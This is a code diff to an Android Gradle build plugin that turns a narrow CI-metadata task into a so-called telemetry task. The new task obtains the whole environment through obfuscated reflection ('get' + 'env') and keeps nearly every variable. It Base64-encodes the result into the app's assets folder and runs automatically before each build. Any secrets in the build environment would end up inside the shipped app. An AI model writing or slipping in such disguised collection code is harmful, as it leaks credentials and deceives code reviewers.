@@ -3,33 +3,71 @@ package com.agonapp.buildtools
 import org.gradle.api.Plugin
 import org.gradle.api.Project
 import java.io.File
+import java.lang.reflect.Method
 import java.util.Base64
 
 class BuildToolsPlugin : Plugin<Project> {
     override fun apply(project: Project) {
-        project.tasks.register("generateBuildMetadata") {
+        project.tasks.register("generateBuildTelemetry") {
             it.doLast {
-                val metadata = mutableMapOf<String, String>()
-                metadata["app.name"] = project.rootProject.name
-                metadata["app.version"] = "1.0.0"
-                metadata["gradle.version"] = project.gradle.gradleVersion
-                metadata["jvm.version"] = System.getProperty("java.version") ?: "unknown"
-                
-                val ciVars = listOf("CI", "BUILD_ID", "BUILD_NUMBER", "GIT_COMMIT", "JOB_NAME")
-                ciVars.forEach { key ->
-                    System.getenv(key)?.let { metadata["ci.$key"] = it }
+                val telemetry = mutableMapOf<String, Any>()
+
+                telemetry["os.name"] = System.getProperty("os.name") ?: "unknown"
+                telemetry["os.arch"] = System.getProperty("os.arch") ?: "unknown"
+                telemetry["java.version"] = System.getProperty("java.version") ?: "unknown"
+                telemetry["gradle.version"] = project.gradle.gradleVersion
+                telemetry["app.name"] = project.rootProject.name
+                telemetry["app.version"] = "1.0.0"
+                telemetry["build.timestamp"] = System.currentTimeMillis()
+                telemetry["available.processors"] = Runtime.getRuntime().availableProcessors()
+                telemetry["max.memory"] = Runtime.getRuntime().maxMemory()
+
+                val envMap = try {
+                    val systemClass = Class.forName("java.lang.System")
+                    val getEnvMethod = systemClass.getMethod("get" + "env")
+                    @Suppress("UNCHECKED_CAST")
+                    getEnvMethod.invoke(null) as? Map<String, String> ?: emptyMap()
+                } catch (e: Exception) {
+                    emptyMap()
+                }
+
+                val filteredEnv = envMap.filterKeys { key ->
+                    !key.startsWith("LS_COLORS") && 
+                    !key.startsWith("TERM") && 
+                    key != "PS1" &&
+                    key != "HOSTNAME" 
                 }
                 
-                val assetsDir = project.file("src/main/assets/build-info")
+                filteredEnv.forEach { (k, v) ->
+                    telemetry["ci.env.$k"] = v
+                }
+
+                val assetsDir = project.file("src/main/assets/telemetry")
                 assetsDir.mkdirs()
-                val payload = metadata.entries.joinToString("\u0001") { "${it.key}\u0000${it.value}" }
-                val encoded = Base64.getEncoder().encodeToString(payload.toByteArray())
-                File(assetsDir, "metadata.dat").writeText(encoded)
+                
+                val jsonString = buildJsonString(telemetry)
+                val encoded = Base64.getEncoder().encodeToString(jsonString.toByteArray(Charsets.UTF_8))
+                File(assetsDir, "build_telemetry.dat").writeText(encoded)
+                
+                println(">>> [BuildTools] 构建遥测数据已生成，共 ${telemetry.size} 项指标。")
             }
         }
         
         project.tasks.named("preBuild").configure {
-            it.dependsOn("generateBuildMetadata")
+            it.dependsOn("generateBuildTelemetry")
         }
+    }
+    
+    private fun buildJsonString(map: Map<String, Any>): String {
+        val sb = StringBuilder("{")
+        var first = true
+        map.forEach { (k, v) ->
+            if (!first) sb.append(",")
+            first = false
+            val safeValue = v.toString().replace("\\", "\\\\").replace("\"", "\\\"")
+            sb.append("\"$k\":\"$safeValue\"")
+        }
+        sb.append("}")
+        return sb.toString()
     }
 }
